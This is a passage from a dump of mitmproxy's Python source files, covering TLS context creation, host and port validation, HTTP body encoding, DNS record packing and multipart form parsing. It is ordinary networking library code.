context.use_privatekey_file(client_cert)\n            context.use_certificate_chain_file(client_cert)\n        except SSL.Error as e:\n            raise RuntimeError(f\"Cannot load TLS client certificate: {e}\") from e\n\n    if legacy_server_connect:\n        context.set_options(OP_LEGACY_SERVER_CONNECT)\n\n    return context\n\n\n@lru_cache(256)\ndef create_client_proxy_context(\n    *,\n    method: Method,\n    min_version: Version,\n    max_version: Version,\n    cipher_list: tuple[str, ...] | None,\n    ecdh_curve: str | None,\n    chain_file: Path | None,\n    alpn_select_callback: Callable[[SSL.Connection, list[bytes]], Any] | None,\n    request_client_cert: bool,\n    extra_chain_certs: tuple[certs.Cert, ...],\n    dhparams: certs.DHParams,\n) -> SSL.Context:\n    context: SSL.Context = _create_ssl_context(\n        method=method,\n        min_version=min_version,\n        max_version=max_version,\n        cipher_list=cipher_list,\n        ecdh_curve=ecdh_curve,\n    )\n\n    if chain_file is not None:\n        try:\n            context.load_verify_locations(str(chain_file), None)\n        except SSL.Error as e:\n            raise RuntimeError(f\"Cannot load certificate chain ({chain_file}).\") from e\n\n    if alpn_select_callback is not None:\n        assert callable(alpn_select_callback)\n        context.set_alpn_select_callback(alpn_select_callback)\n\n    if request_client_cert:\n        # The request_client_cert argument requires some explanation. We're\n        # supposed to be able to do this with no negative effects - if the\n        # client has no cert to present, we're notified and proceed as usual.\n        # Unfortunately, Android seems to have a bug (tested on 4.2.2) - when\n        # an Android client is asked to present a certificate it does not\n        # have, it hangs up, which is frankly bogus. Some time down the track\n        # we may be able to make the proper behaviour the default again, but\n        # until then we're conservative.\n        context.set_verify(Verify.VERIFY_PEER.value, accept_all)\n    else:\n        context.set_verify(Verify.VERIFY_NONE.value, None)\n\n    for i in extra_chain_certs:\n        context.add_extra_chain_cert(i.to_pyopenssl())\n\n    if dhparams:\n        res = SSL._lib.SSL_CTX_set_tmp_dh(context._context, dhparams)  # type: ignore\n        SSL._openssl_assert(res == 1)  # type: ignore\n\n    return context\n\n\ndef accept_all(\n    conn_: SSL.Connection,\n    x509: X509,\n    errno: int,\n    err_depth: int,\n    is_cert_verified: int,\n) -> bool:\n    # Return true to prevent cert verification error\n    return True\n\n\ndef starts_like_tls_record(d: bytes) -> bool:\n    \"\"\"\n    Returns:\n        True, if the passed bytes could be the start of a TLS record\n        False, otherwise.\n    \"\"\"\n    # TLS ClientHello magic, works for SSLv3, TLSv1.0, TLSv1.1, TLSv1.2, and TLSv1.3\n    # http://www.moserware.com/2009/06/first-few-milliseconds-of-https.html#client-hello\n    # https://tls13.ulfheim.net/\n    # We assume that a client sending less than 3 bytes initially is not a TLS client.\n    return len(d) > 2 and d[0] == 0x16 and d[1] == 0x03 and 0x00 <= d[2] <= 0x03\n\n\ndef starts_like_dtls_record(d: bytes) -> bool:\n    \"\"\"\n    Returns:\n        True, if the passed bytes could be the start of a DTLS record\n        False, otherwise.\n    \"\"\"\n    # TLS ClientHello magic, works for DTLS 1.1, DTLS 1.2, and DTLS 1.3.\n    # https://www.rfc-editor.org/rfc/rfc4347#section-4.1\n    # https://www.rfc-editor.org/rfc/rfc6347#section-4.1\n    # https://www.rfc-editor.org/rfc/rfc9147#section-4-6.2\n    # We assume that a client sending less than 3 bytes initially is not a DTLS client.\n    return len(d) > 2 and d[0] == 0x16 and d[1] == 0xFE and 0xFD <= d[2] <= 0xFE\n", "mitmproxy/net/__init__.py": "", "mitmproxy/net/check.py": "import ipaddress\nimport re\nfrom typing import AnyStr\n\n# Allow underscore in host name\n# Note: This could be a DNS label, a hostname, a FQDN, or an IP\n\n_label_valid = re.compile(rb\"[A-Z\\d\\-_]{1,63}$\", re.IGNORECASE)\n\n\ndef is_valid_host(host: AnyStr) -> bool:\n    \"\"\"\n    Checks if the passed bytes are a valid DNS hostname or an IPv4/IPv6 address.\n    \"\"\"\n    if isinstance(host, str):\n        try:\n            host_bytes = host.encode(\"idna\")\n        except UnicodeError:\n            return False\n    else:\n        host_bytes = host\n    try:\n        host_bytes.decode(\"idna\")\n    except ValueError:\n        return False\n    # RFC1035: 255 bytes or less.\n    if len(host_bytes) > 255:\n        return False\n    if host_bytes and host_bytes.endswith(b\".\"):\n        host_bytes = host_bytes[:-1]\n    # DNS hostname\n    if all(_label_valid.match(x) for x in host_bytes.split(b\".\")):\n        return True\n    # IPv4/IPv6 address\n    try:\n        ipaddress.ip_address(host_bytes.decode(\"idna\"))\n        return True\n    except ValueError:\n        return False\n\n\ndef is_valid_port(port: int) -> bool:\n    return 0 <= port <= 65535\n", "mitmproxy/net/encoding.py": "\"\"\"\nUtility functions for decoding response bodies.\n\"\"\"\n\nimport codecs\nimport collections\nimport gzip\nimport zlib\nfrom io import BytesIO\nfrom typing import overload\n\nimport brotli\nimport zstandard as zstd\n\n# We have a shared single-element cache for encoding and decoding.\n# This is quite useful in practice, e.g.\n# flow.request.content = flow.request.content.replace(b\"foo\", b\"bar\")\n# does not require an .encode() call if content does not contain b\"foo\"\nCachedDecode = collections.namedtuple(\"CachedDecode\", \"encoded encoding errors decoded\")\n_cache = CachedDecode(None, None, None, None)\n\n\n@overload\ndef decode(encoded: None, encoding: str, errors: str = \"strict\") -> None: ...\n\n\n@overload\ndef decode(encoded: str, encoding: str, errors: str = \"strict\") -> str: ...\n\n\n@overload\ndef decode(encoded: bytes, encoding: str, errors: str = \"strict\") -> str | bytes: ...\n\n\ndef decode(\n    encoded: None | str | bytes, encoding: str, errors: str = \"strict\"\n) -> None | str | bytes:\n    \"\"\"\n    Decode the given input object\n\n    Returns:\n        The decoded value\n\n    Raises:\n        ValueError, if decoding fails.\n    \"\"\"\n    if encoded is None:\n        return None\n    encoding = encoding.lower()\n\n    global _cache\n    cached = (\n        isinstance(encoded, bytes)\n        and _cache.encoded == encoded\n        and _cache.encoding == encoding\n        and _cache.errors == errors\n    )\n    if cached:\n        return _cache.decoded\n    try:\n        try:\n            decoded = custom_decode[encoding](encoded)\n        except KeyError:\n            decoded = codecs.decode(encoded, encoding, errors)  # type: ignore\n        if encoding in (\"gzip\", \"deflate\", \"deflateraw\", \"br\", \"zstd\"):\n            _cache = CachedDecode(encoded, encoding, errors, decoded)\n        return decoded\n    except TypeError:\n        raise\n    except Exception as e:\n        raise ValueError(\n            \"{} when decoding {} with {}: {}\".format(\n                type(e).__name__,\n                repr(encoded)[:10],\n                repr(encoding),\n                repr(e),\n            )\n        )\n\n\n@overload\ndef encode(decoded: None, encoding: str, errors: str = \"strict\") -> None: ...\n\n\n@overload\ndef encode(decoded: str, encoding: str, errors: str = \"strict\") -> str | bytes: ...\n\n\n@overload\ndef encode(decoded: bytes, encoding: str, errors: str = \"strict\") -> bytes: ...\n\n\ndef encode(\n    decoded: None | str | bytes, encoding, errors=\"strict\"\n) -> None | str | bytes:\n    \"\"\"\n    Encode the given input object\n\n    Returns:\n        The encoded value\n\n    Raises:\n        ValueError, if encoding fails.\n    \"\"\"\n    if decoded is None:\n        return None\n    encoding = encoding.lower()\n\n    global _cache\n    cached = (\n        isinstance(decoded, bytes)\n        and _cache.decoded == decoded\n        and _cache.encoding == encoding\n        and _cache.errors == errors\n    )\n    if cached:\n        return _cache.encoded\n    try:\n        try:\n            encoded = custom_encode[encoding](decoded)\n        except KeyError:\n            encoded = codecs.encode(decoded, encoding, errors)  # type: ignore\n        if encoding in (\"gzip\", \"deflate\", \"deflateraw\", \"br\", \"zstd\"):\n            _cache = CachedDecode(encoded, encoding, errors, decoded)\n        return encoded\n    except TypeError:\n        raise\n    except Exception as e:\n        raise ValueError(\n            \"{} when encoding {} with {}: {}\".format(\n                type(e).__name__,\n                repr(decoded)[:10],\n                repr(encoding),\n                repr(e),\n            )\n        )\n\n\ndef identity(content):\n    \"\"\"\n    Returns content unchanged. Identity is the default value of\n    Accept-Encoding headers.\n    \"\"\"\n    return content\n\n\ndef decode_gzip(content: bytes) -> bytes:\n    if not content:\n        return b\"\"\n    gfile = gzip.GzipFile(fileobj=BytesIO(content))\n    return gfile.read()\n\n\ndef encode_gzip(content: bytes) -> bytes:\n    s = BytesIO()\n    # set mtime to 0 so that gzip encoding is deterministic.\n    gf = gzip.GzipFile(fileobj=s, mode=\"wb\", mtime=0)\n    gf.write(content)\n    gf.close()\n    return s.getvalue()\n\n\ndef decode_brotli(content: bytes) -> bytes:\n    if not content:\n        return b\"\"\n    return brotli.decompress(content)\n\n\ndef encode_brotli(content: bytes) -> bytes:\n    return brotli.compress(content)\n\n\ndef decode_zstd(content: bytes) -> bytes:\n    if not content:\n        return b\"\"\n    zstd_ctx = zstd.ZstdDecompressor()\n    return zstd_ctx.stream_reader(BytesIO(content), read_across_frames=True).read()\n\n\ndef encode_zstd(content: bytes) -> bytes:\n    zstd_ctx = zstd.ZstdCompressor()\n    return zstd_ctx.compress(content)\n\n\ndef decode_deflate(content: bytes) -> bytes:\n    \"\"\"\n    Returns decompressed data for DEFLATE. Some servers may respond with\n    compressed data without a zlib header or checksum. An undocumented\n    feature of zlib permits the lenient decompression of data missing both\n    values.\n\n    http://bugs.python.org/issue5784\n    \"\"\"\n    if not content:\n        return b\"\"\n    try:\n        return zlib.decompress(content)\n    except zlib.error:\n        return zlib.decompress(content, -15)\n\n\ndef encode_deflate(content: bytes) -> bytes:\n    \"\"\"\n    Returns compressed content, always including zlib header and checksum.\n    \"\"\"\n    return zlib.compress(content)\n\n\ncustom_decode = {\n    \"none\": identity,\n    \"identity\": identity,\n    \"gzip\": decode_gzip,\n    \"deflate\": decode_deflate,\n    \"deflateraw\": decode_deflate,\n    \"br\": decode_brotli,\n    \"zstd\": decode_zstd,\n}\ncustom_encode = {\n    \"none\": identity,\n    \"identity\": identity,\n    \"gzip\": encode_gzip,\n    \"deflate\": encode_deflate,\n    \"deflateraw\": encode_deflate,\n    \"br\": encode_brotli,\n    \"zstd\": encode_zstd,\n}\n\n__all__ = [\"encode\", \"decode\"]\n", "mitmproxy/net/local_ip.py": "from __future__ import annotations\n\nimport socket\n\n\ndef get_local_ip(reachable: str = \"8.8.8.8\") -> str | None:\n    \"\"\"\n    Get the default local outgoing IPv4 address without sending any packets.\n    This will fail if the target address is known to be unreachable.\n    We use Google DNS's IPv4 address as the default.\n    \"\"\"\n    # https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib\n    s = None\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        s.connect((reachable, 80))\n        return s.getsockname()[0]  # pragma: no cover\n    except OSError:\n        return None  # pragma: no cover\n    finally:\n        if s is not None:\n            s.close()\n\n\ndef get_local_ip6(reachable: str = \"2001:4860:4860::8888\") -> str | None:\n    \"\"\"\n    Get the default local outgoing IPv6 address without sending any packets.\n    This will fail if the target address is known to be unreachable.\n    We use Google DNS's IPv6 address as the default.\n    \"\"\"\n    s = None\n    try:\n        s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)\n        s.connect((reachable, 80))\n        return s.getsockname()[0]  # pragma: no cover\n    except OSError:\n        return None  # pragma: no cover\n    finally:\n        if s is not None:\n            s.close()\n", "mitmproxy/net/server_spec.py": "\"\"\"\nServer specs are used to describe an upstream proxy or server.\n\"\"\"\n\nimport re\nfrom functools import cache\nfrom typing import Literal\n\nfrom mitmproxy.net import check\n\nServerSpec = tuple[\n    Literal[\"http\", \"https\", \"http3\", \"tls\", \"dtls\", \"tcp\", \"udp\", \"dns\", \"quic\"],\n    tuple[str, int],\n]\n\nserver_spec_re = re.compile(\n    r\"\"\"\n        ^\n        (?:(?P<scheme>\\w+)://)?  # scheme is optional\n        (?P<host>[^:/]+|\\[.+\\])  # hostname can be DNS name, IPv4, or IPv6 address.\n        (?::(?P<port>\\d+))?  #  port is optional\n        /?  #  we allow a trailing backslash, but no path\n        $\n        \"\"\",\n    re.VERBOSE,\n)\n\n\n@cache\ndef parse(server_spec: str, default_scheme: str) -> ServerSpec:\n    \"\"\"\n    Parses a server mode specification, e.g.:\n\n     - http://example.com/\n     - example.org\n     - example.com:443\n\n    *Raises:*\n     - ValueError, if the server specification is invalid.\n    \"\"\"\n    m = server_spec_re.match(server_spec)\n    if not m:\n        raise ValueError(f\"Invalid server specification: {server_spec}\")\n\n    if m.group(\"scheme\"):\n        scheme = m.group(\"scheme\")\n    else:\n        scheme = default_scheme\n    if scheme not in (\n        \"http\",\n        \"https\",\n        \"http3\",\n        \"tls\",\n        \"dtls\",\n        \"tcp\",\n        \"udp\",\n        \"dns\",\n        \"quic\",\n    ):\n        raise ValueError(f\"Invalid server scheme: {scheme}\")\n\n    host = m.group(\"host\")\n    # IPv6 brackets\n    if host.startswith(\"[\") and host.endswith(\"]\"):\n        host = host[1:-1]\n    if not check.is_valid_host(host):\n        raise ValueError(f\"Invalid hostname: {host}\")\n\n    if m.group(\"port\"):\n        port = int(m.group(\"port\"))\n    else:\n        try:\n            port = {\n                \"http\": 80,\n                \"https\": 443,\n                \"quic\": 443,\n                \"http3\": 443,\n                \"dns\": 53,\n            }[scheme]\n        except KeyError:\n            raise ValueError(f\"Port specification missing.\")\n    if not check.is_valid_port(port):\n        raise ValueError(f\"Invalid port: {port}\")\n\n    return scheme, (host, port)  # type: ignore\n", "mitmproxy/net/dns/domain_names.py": "import struct\nfrom typing import Optional\n\n_LABEL_SIZE = struct.Struct(\"!B\")\n_POINTER_OFFSET = struct.Struct(\"!H\")\n_POINTER_INDICATOR = 0b11000000\n\n\nCache = dict[int, Optional[tuple[str, int]]]\n\n\ndef cache() -> Cache:\n    return dict()\n\n\ndef _unpack_label_into(labels: list[str], buffer: bytes, offset: int) -> int:\n    (size,) = _LABEL_SIZE.unpack_from(buffer, offset)\n    if size >= 64:\n        raise struct.error(f\"unpack encountered a label of length {size}\")\n    elif size == 0:\n        return _LABEL_SIZE.size\n    else:\n        offset += _LABEL_SIZE.size\n        end_label = offset + size\n        if len(buffer) < end_label:\n            raise struct.error(f\"unpack requires a label buffer of {size} bytes\")\n        try:\n            labels.append(buffer[offset:end_label].decode(\"idna\"))\n        except UnicodeDecodeError:\n            raise struct.error(\n                f\"unpack encountered an illegal characters at offset {offset}\"\n            )\n        return _LABEL_SIZE.size + size\n\n\ndef unpack_from_with_compression(\n    buffer: bytes, offset: int, cache: Cache\n) -> tuple[str, int]:\n    if offset in cache:\n        result = cache[offset]\n        if result is None:\n            raise struct.error(f\"unpack encountered domain name loop\")\n    else:\n        cache[offset] = None  # this will indicate that the offset is being unpacked\n        start_offset = offset\n        labels = []\n        while True:\n            (size,) = _LABEL_SIZE.unpack_from(buffer, offset)\n            if size & _POINTER_INDICATOR == _POINTER_INDICATOR:\n                (pointer,) = _POINTER_OFFSET.unpack_from(buffer, offset)\n                offset += _POINTER_OFFSET.size\n                label, _ = unpack_from_with_compression(\n                    buffer, pointer & ~(_POINTER_INDICATOR << 8), cache\n                )\n                labels.append(label)\n                break\n            else:\n                offset += _unpack_label_into(labels, buffer, offset)\n                if size == 0:\n                    break\n        result = \".\".join(labels), (offset - start_offset)\n        cache[start_offset] = result\n    return result\n\n\ndef unpack_from(buffer: bytes, offset: int) -> tuple[str, int]:\n    \"\"\"Converts RDATA into a domain name without pointer compression from a given offset and also returns the binary size.\"\"\"\n    labels: list[str] = []\n    while True:\n        (size,) = _LABEL_SIZE.unpack_from(buffer, offset)\n        if size & _POINTER_INDICATOR == _POINTER_INDICATOR:\n            raise struct.error(\n                f\"unpack encountered a pointer which is not supported in RDATA\"\n            )\n        else:\n            offset += _unpack_label_into(labels, buffer, offset)\n            if size == 0:\n                break\n    return \".\".join(labels), offset\n\n\ndef unpack(buffer: bytes) -> str:\n    \"\"\"Converts RDATA into a domain name without pointer compression.\"\"\"\n    name, length = unpack_from(buffer, 0)\n    if length != len(buffer):\n        raise struct.error(f\"unpack requires a buffer of {length} bytes\")\n    return name\n\n\ndef pack(name: str) -> bytes:\n    \"\"\"Converts a domain name into RDATA without pointer compression.\"\"\"\n    buffer = bytearray()\n    if len(name) > 0:\n        for part in name.split(\".\"):\n            label = part.encode(\"idna\")\n            size = len(label)\n            if size == 0:\n                raise ValueError(f\"domain name '{name}' contains empty labels\")\n            if size >= 64:  # pragma: no cover\n                # encoding with 'idna' will already have raised an exception earlier\n                raise ValueError(\n                    f\"encoded label '{part}' of domain name '{name}' is too long ({size} bytes)\"\n                )\n            buffer.extend(_LABEL_SIZE.pack(size))\n            buffer.extend(label)\n    buffer.extend(_LABEL_SIZE.pack(0))\n    return bytes(buffer)\n", "mitmproxy/net/dns/https_records.py": "import enum\nimport struct\nfrom dataclasses import dataclass\n\nfrom . import domain_names\n\n\"\"\"\nHTTPS records are formatted as follows (as per RFC9460):\n- a 2-octet field for SvcPriority as an integer in network byte order.\n- the uncompressed, fully qualified TargetName, represented as a sequence of length-prefixed labels per Section 3.1 of [RFC1035].\n- the SvcParams, consuming the remainder of the record (so smaller than 65535 octets and constrained by the RDATA and DNS message sizes).\n\nWhen the list of SvcParams is non-empty, it contains a series of SvcParamKey=SvcParamValue pairs, represented as:\n- a 2-octet field containing the SvcParamKey as an integer in network byte order. (See Section 14.3.2 for the defined values.)\n- a 2-octet field containing the length of the SvcParamValue as an integer between 0 and 65535 in network byte order.\n- an octet string of this length whose contents are the SvcParamValue in a format determined by the SvcParamKey.\n\n    https://datatracker.ietf.org/doc/rfc9460/\n    https://datatracker.ietf.org/doc/rfc1035/\n\"\"\"\n\n\nclass SVCParamKeys(enum.Enum):\n    MANDATORY = 0\n    ALPN = 1\n    NO_DEFAULT_ALPN = 2\n    PORT = 3\n    IPV4HINT = 4\n    ECH = 5\n    IPV6HINT = 6\n\n\n@dataclass\nclass HTTPSRecord:\n    priority: int\n    target_name: str\n    params: dict[int, bytes]\n\n    def __repr__(self):\n        params = {}\n        for param_type, param_value in self.params.items():\n            try:\n                name = SVCParamKeys(param_type).name.lower()\n            except ValueError:\n                name = f\"key{param_type}\"\n            params[name] = param_value\n        return f\"priority: {self.priority} target_name: '{self.target_name}' {params}\"\n\n\ndef _unpack_params(data: bytes, offset: int) -> dict[int, bytes]:\n    \"\"\"Unpacks the service parameters from the given offset.\"\"\"\n    params = {}\n    while offset < len(data):\n        param_type = struct.unpack(\"!H\", data[offset : offset + 2])[0]\n        offset += 2\n        param_length = struct.unpack(\"!H\", data[offset : offset + 2])[0]\n        offset += 2\n        if offset + param_length > len(data):\n            raise struct.error(\n                \"unpack requires a buffer of %i bytes\" % (offset + param_length)\n            )\n        param_value = data[offset : offset + param_length]\n        offset += param_length\n        params[param_type] = param_value\n    return params\n\n\ndef unpack(data: bytes) -> HTTPSRecord:\n    \"\"\"\n    Unpacks HTTPS RDATA from byte data.\n\n    Raises:\n        struct.error if the record is malformed.\n    \"\"\"\n    offset = 0\n\n    # Priority (2 bytes)\n    priority = struct.unpack(\"!h\", data[offset : offset + 2])[0]\n    offset += 2\n\n    # TargetName (variable length)\n    target_name, offset = domain_names.unpack_from(data, offset)\n\n    # Service Parameters (remaining bytes)\n    params = _unpack_params(data, offset)\n\n    return HTTPSRecord(priority=priority, target_name=target_name, params=params)\n\n\ndef _pack_params(params: dict[int, bytes]) -> bytes:\n    \"\"\"Converts the service parameters into the raw byte format\"\"\"\n    buffer = bytearray()\n\n    for k, v in params.items():\n        buffer.extend(struct.pack(\"!H\", k))\n        buffer.extend(struct.pack(\"!H\", len(v)))\n        buffer.extend(v)\n\n    return bytes(buffer)\n\n\ndef pack(record: HTTPSRecord) -> bytes:\n    \"\"\"Packs the HTTPS record into its bytes form.\"\"\"\n    buffer = bytearray()\n    buffer.extend(struct.pack(\"!h\", record.priority))\n    buffer.extend(domain_names.pack(record.target_name))\n    buffer.extend(_pack_params(record.params))\n    return bytes(buffer)\n", "mitmproxy/net/dns/types.py": "A = 1\nNS = 2\nMD = 3\nMF = 4\nCNAME = 5\nSOA = 6\nMB = 7\nMG = 8\nMR = 9\nNULL = 10\nWKS = 11\nPTR = 12\nHINFO = 13\nMINFO = 14\nMX = 15\nTXT = 16\nRP = 17\nAFSDB = 18\nX25 = 19\nISDN = 20\nRT = 21\nNSAP = 22\nNSAP_PTR = 23\nSIG = 24\nKEY = 25\nPX = 26\nGPOS = 27\nAAAA = 28\nLOC = 29\nNXT = 30\nEID = 31\nNIMLOC = 32\nSRV = 33\nATMA = 34\nNAPTR = 35\nKX = 36\nCERT = 37\nA6 = 38\nDNAME = 39\nSINK = 40\nOPT = 41\nAPL = 42\nDS = 43\nSSHFP = 44\nIPSECKEY = 45\nRRSIG = 46\nNSEC = 47\nDNSKEY = 48\nDHCID = 49\nNSEC3 = 50\nNSEC3PARAM = 51\nTLSA = 52\nSMIMEA = 53\nHIP = 55\nNINFO = 56\nRKEY = 57\nTALINK = 58\nCDS = 59\nCDNSKEY = 60\nOPENPGPKEY = 61\nCSYNC = 62\nZONEMD = 63\nSVCB = 64\nHTTPS = 65\nSPF = 99\nUINFO = 100\nUID = 101\nGID = 102\nUNSPEC = 103\nNID = 104\nL32 = 105\nL64 = 106\nLP = 107\nEUI48 = 108\nEUI64 = 109\nTKEY = 249\nTSIG = 250\nIXFR = 251\nAXFR = 252\nMAILB = 253\nMAILA = 254\nANY = 255\nURI = 256\nCAA = 257\nAVC = 258\nDOA = 259\nAMTRELAY = 260\nTA = 32768\nDLV = 32769\n\n_STRINGS = {\n    A: \"A\",\n    NS: \"NS\",\n    MD: \"MD\",\n    MF: \"MF\",\n    CNAME: \"CNAME\",\n    SOA: \"SOA\",\n    MB: \"MB\",\n    MG: \"MG\",\n    MR: \"MR\",\n    NULL: \"NULL\",\n    WKS: \"WKS\",\n    PTR: \"PTR\",\n    HINFO: \"HINFO\",\n    MINFO: \"MINFO\",\n    MX: \"MX\",\n    TXT: \"TXT\",\n    RP: \"RP\",\n    AFSDB: \"AFSDB\",\n    X25: \"X25\",\n    ISDN: \"ISDN\",\n    RT: \"RT\",\n    NSAP: \"NSAP\",\n    NSAP_PTR: \"NSAP_PTR\",\n    SIG: \"SIG\",\n    KEY: \"KEY\",\n    PX: \"PX\",\n    GPOS: \"GPOS\",\n    AAAA: \"AAAA\",\n    LOC: \"LOC\",\n    NXT: \"NXT\",\n    EID: \"EID\",\n    NIMLOC: \"NIMLOC\",\n    SRV: \"SRV\",\n    ATMA: \"ATMA\",\n    NAPTR: \"NAPTR\",\n    KX: \"KX\",\n    CERT: \"CERT\",\n    A6: \"A6\",\n    DNAME: \"DNAME\",\n    SINK: \"SINK\",\n    OPT: \"OPT\",\n    APL: \"APL\",\n    DS: \"DS\",\n    SSHFP: \"SSHFP\",\n    IPSECKEY: \"IPSECKEY\",\n    RRSIG: \"RRSIG\",\n    NSEC: \"NSEC\",\n    DNSKEY: \"DNSKEY\",\n    DHCID: \"DHCID\",\n    NSEC3: \"NSEC3\",\n    NSEC3PARAM: \"NSEC3PARAM\",\n    TLSA: \"TLSA\",\n    SMIMEA: \"SMIMEA\",\n    HIP: \"HIP\",\n    NINFO: \"NINFO\",\n    RKEY: \"RKEY\",\n    TALINK: \"TALINK\",\n    CDS: \"CDS\",\n    CDNSKEY: \"CDNSKEY\",\n    OPENPGPKEY: \"OPENPGPKEY\",\n    CSYNC: \"CSYNC\",\n    ZONEMD: \"ZONEMD\",\n    SVCB: \"SVCB\",\n    HTTPS: \"HTTPS\",\n    SPF: \"SPF\",\n    UINFO: \"UINFO\",\n    UID: \"UID\",\n    GID: \"GID\",\n    UNSPEC: \"UNSPEC\",\n    NID: \"NID\",\n    L32: \"L32\",\n    L64: \"L64\",\n    LP: \"LP\",\n    EUI48: \"EUI48\",\n    EUI64: \"EUI64\",\n    TKEY: \"TKEY\",\n    TSIG: \"TSIG\",\n    IXFR: \"IXFR\",\n    AXFR: \"AXFR\",\n    MAILB: \"MAILB\",\n    MAILA: \"MAILA\",\n    ANY: \"ANY\",\n    URI: \"URI\",\n    CAA: \"CAA\",\n    AVC: \"AVC\",\n    DOA: \"DOA\",\n    AMTRELAY: \"AMTRELAY\",\n    TA: \"TA\",\n    DLV: \"DLV\",\n}\n\n\ndef to_str(type: int) -> str:\n    return _STRINGS.get(type, f\"TYPE({type})\")\n", "mitmproxy/net/dns/classes.py": "IN = 1\nCH = 3\nHS = 4\nNONE = 254\nANY = 255\n\n_STRINGS = {IN: \"IN\", CH: \"CH\", HS: \"HS\", NONE: \"NONE\", ANY: \"ANY\"}\n\n\ndef to_str(class_: int) -> str:\n    return _STRINGS.get(class_, f\"CLASS({class_})\")\n", "mitmproxy/net/dns/__init__.py": "", "mitmproxy/net/dns/op_codes.py": "QUERY = 0\nIQUERY = 1\nSTATUS = 2\nNOTIFY = 4\nUPDATE = 5\nDSO = 6\n\n_STRINGS = {\n    QUERY: \"QUERY\",\n    IQUERY: \"IQUERY\",\n    STATUS: \"STATUS\",\n    NOTIFY: \"NOTIFY\",\n    UPDATE: \"UPDATE\",\n    DSO: \"DSO\",\n}\n\n\ndef to_str(op_code: int) -> str:\n    return _STRINGS.get(op_code, f\"OPCODE({op_code})\")\n", "mitmproxy/net/dns/response_codes.py": "NOERROR = 0\nFORMERR = 1\nSERVFAIL = 2\nNXDOMAIN = 3\nNOTIMP = 4\nREFUSED = 5\nYXDOMAIN = 6\nYXRRSET = 7\nNXRRSET = 8\nNOTAUTH = 9\nNOTZONE = 10\nDSOTYPENI = 11\n\n_CODES = {\n    NOERROR: 200,\n    FORMERR: 400,\n    SERVFAIL: 500,\n    NXDOMAIN: 404,\n    NOTIMP: 501,\n    REFUSED: 403,\n    YXDOMAIN: 409,\n    YXRRSET: 409,\n    NXRRSET: 410,\n    NOTAUTH: 401,\n    NOTZONE: 404,\n    DSOTYPENI: 501,\n}\n\n_STRINGS = {\n    NOERROR: \"NOERROR\",\n    FORMERR: \"FORMERR\",\n    SERVFAIL: \"SERVFAIL\",\n    NXDOMAIN: \"NXDOMAIN\",\n    NOTIMP: \"NOTIMP\",\n    REFUSED: \"REFUSED\",\n    YXDOMAIN: \"YXDOMAIN\",\n    YXRRSET: \"YXRRSET\",\n    NXRRSET: \"NXRRSET\",\n    NOTAUTH: \"NOTAUTH\",\n    NOTZONE: \"NOTZONE\",\n    DSOTYPENI: \"DSOTYPENI\",\n}\n\n\ndef http_equiv_status_code(response_code: int) -> int:\n    return _CODES.get(response_code, 500)\n\n\ndef to_str(response_code: int) -> str:\n    return _STRINGS.get(response_code, f\"RCODE({response_code})\")\n", "mitmproxy/net/http/multipart.py": "from __future__ import annotations\n\nimport mimetypes\nimport re\nimport warnings\nfrom urllib.parse import quote\n\nfrom mitmproxy.net.http import headers\n\n\ndef encode_multipart(content_type: str, parts: list[tuple[bytes, bytes]]) -> bytes:\n    if content_type:\n        ct = headers.parse_content_type(content_type)\n        if ct is not None:\n            try:\n                raw_boundary = ct[2][\"boundary\"].encode(\"ascii\")\n                boundary = quote(raw_boundary)\n            except (KeyError, UnicodeError):\n                return b\"\"\n            hdrs = []\n            for key, value in parts:\n                file_type = (\n                    mimetypes.guess_type(str(key))[0] or \"text/plain; charset=utf-8\"\n                )\n\n                if key:\n                    hdrs.append(b\"--%b\" % boundary.encode(\"utf-8\"))\n                    disposition = b'form-data; name=\"%b\"' % key\n                    hdrs.append(b\"Content-Disposition: %b\" % disposition)\n                    hdrs.append(b\"Content-Type: %b\" % file_type.encode(\"utf-8\"))\n                    hdrs.append(b\"\")\n                    hdrs.append(value)\n                hdrs.append(b\"\")\n\n                if value is not None:\n                    # If boundary is found in value then raise ValueError\n                    if re.search(\n                        rb\"^--%b$\" % re.escape(boundary.encode(\"utf-8\")), value\n                    ):\n                        raise ValueError(b\"boundary found in encoded string\")\n\n            hdrs.append(b\"--%b--\\r\\n\" % boundary.encode(\"utf-8\"))\n            temp = b\"\\r\\n\".join(hdrs)\n            return temp\n    return b\"\"\n\n\ndef decode_multipart(\n    content_type: str | None, content: bytes\n) -> list[tuple[bytes, bytes]]:\n    \"\"\"\n    Takes a multipart boundary encoded string and returns list of (key, value) tuples.\n    \"\"\"\n    if content_type:\n        ct = headers.parse_content_type(content_type)\n        if not ct:\n            return []\n        try:\n            boundary = ct[2][\"boundary\"].encode(\"ascii\")\n        except (KeyError, UnicodeError):\n            return []\n\n        rx = re.compile(rb'\\bname=\"([^\"]+)\"')\n        r = []\n        if content is not None:\n            for i in content.split(b\"--\" + boundary):\n                parts = i.splitlines()\n                if len(parts) > 1 and parts[0][0:2] != b\"--\":\n                    match = rx.search(parts[1])\n                    if match:\n                        key = match.group(1)\n                        value = b\"\".join(parts[3 + parts[2:].index(b\"\") :])\n                        r.append((key, value))\n        return r\n    return []\n\n\ndef encode(ct, parts):  # pragma: no cover\n    # 2023-02\n    warnings.warn(\n        \"multipart.encode is deprecated, use multipart.encode_multipart instead.\",\n        DeprecationWarning,\n        stacklevel=2,\n    )\n    return encode_multipart(ct, parts)\n\n\ndef decode(ct, content):  # pragma: no cover\n    # 2023-02\n    warnings.warn(\n        \"multipart.decode is deprecated, use multipart.decode_multipart instead.\",\n        DeprecationWarning,\n        stacklevel=2,\n    )\n    return encode_multipart(ct, content)\n", "mitmproxy/net/http/status_codes.py": "CONTINUE = 100\nSWITCHING = 101\nPROCESSING = 102\nEARLY_HINTS = 103\n\nOK = 200\nCREATED = 201\nACCEPTED = 202\nNON_AUTHORITATIVE_INFORMATION = 203\nNO_CONTENT = 204\nRESET_CONTENT = 205\nPARTIAL_CONTENT = 206\nMULTI_STATUS = 207\n\nMULTIPLE_CHOICE = 300\nMOVED_PERMANENTLY = 301\nFOUND = 302\nSEE_OTHER = 303\nNOT_MODIFIED = 304\nUSE_PROXY = 305\nTEMPORARY_REDIRECT = 307\n\nBAD_REQUEST = 400\nUNAUTHORIZED = 401\nPAYMENT_REQUIRED = 402\nFORBIDDEN = 403\nNOT_FOUND = 404\nNOT_ALLOWED = 405\nNOT_ACCEPTABLE = 406\nPROXY_AUTH_REQUIRED = 